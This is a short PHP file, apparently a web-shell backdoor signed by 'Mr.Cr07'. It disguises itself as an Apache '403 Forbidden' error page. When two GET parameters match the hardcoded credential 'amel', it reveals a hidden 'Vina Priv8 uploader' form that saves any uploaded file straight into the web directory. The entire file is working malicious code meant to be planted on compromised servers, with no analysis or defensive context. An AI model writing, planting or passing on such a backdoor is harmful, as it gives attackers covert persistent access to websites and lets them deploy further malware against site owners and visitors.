<?php
// author : Mr.Cr07

echo"  <title> Forbidden</title>
</head><body>
<h1>Forbidden</h1>

<p>You don't have permission to access ".$_SERVER['REQUEST_URI']."  on this server.<br>
Server unable to read  file, denying access to be safe
<br><br>
Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.</p>";

if(isset($_POST['ntap']))
{
$pile = $_FILES['filecuk']['name'];
$piles= $_FILES['filecuk']['tmp_name'];
$folder="";
if(move_uploaded_file($piles,$folder.$pile))
{
$hasil = "mie Sukses !<a href='$pile' target='_blank'>Klik sini </A>";
}
else
{
$hasil = "Failed!";
}
}
$usercuk ="amel";//user
$passcuk ="amel";//password
// exploit : ?user=YouUser&pass=YourPass
if($_GET['a']==$usercuk &&$_GET['b']==$passcuk){
echo'
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>#~ Mr.Cr07~#</title>
</head>
<body>
<center>
<h1>#~ Vina Priv8 uploader ~#</h1>
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="filecuk" />
<input type="submit" name="ntap" value="ntapz!">
</form>
'.$hasil.'
</body>
</html>';
}
?>